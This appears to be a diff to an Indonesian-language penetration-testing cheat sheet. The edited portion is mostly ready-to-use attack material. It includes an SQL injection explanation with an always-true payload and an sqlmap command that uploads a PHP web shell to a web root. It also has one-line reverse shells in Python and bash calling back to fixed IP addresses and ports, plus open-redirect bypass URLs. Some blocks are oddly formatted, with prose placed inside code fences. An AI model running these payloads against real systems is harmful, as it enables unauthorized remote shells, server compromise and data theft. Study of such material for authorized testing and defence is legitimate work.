@@ -27,23 +27,46 @@ wget http://69.69.69.69:899/linux-exploit-suggester.sh
 
 SQLi to RCE
 ```python
+Celah yang muncul ketika aplikasi menyambung input pengguna langsung ke dalam query SQL tanpa pemisahan antara data dan kode.
+Akibatnya, penyerang dapat mengubah maksud query -- membaca, memodifikasi, atau menghapus data, bahkan mengeksekusi perintah pada server.
+
+Cara kerja:
+SELECT * FROM users WHERE name = 'alice'
+SELECT * FROM users WHERE name = '' OR '1'='1' --'
+
+Tanda kutip pada input menutup string lebih awal, lalu -- mengomentari sisa query asli.
+Kondisi selalu benar → seluruh baris dikembalikan.
+
 sqlmap.py -u "http://192.168.1.69:6969/logs/search?q='" --file-write="C:\Users\MYUSER-FU\Downloads\shell.php" --file-dest="/var/www/html/shell.php"
+
+
+
+
 ```
 
 Reverse Shell dari Pentest Monkey 
 ```bash
 September 4, 2011
 
-* Python dan Python3
+# Python dan Python3
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.69",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.69",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-* Bash | this was tested on Ubuntu 10.10
+# Bash | this was tested on Ubuntu 10.10
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
- 
 ```
 
+
+
+
+Open Redirect (examples)
+```bash
+example.com/redirect?url=http://google.com (Allowed)
+example.com/redirect?url=http://evil.com (Not Allowed)
+example.com/redirect?url=http://evilgoogle.com (Allowed - Bypass!)
+example.com/redirect?url=http://evil.com/?http://google.com (Allowed - Bypass!)
+``` 
 
 
 * LinPEAS = https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
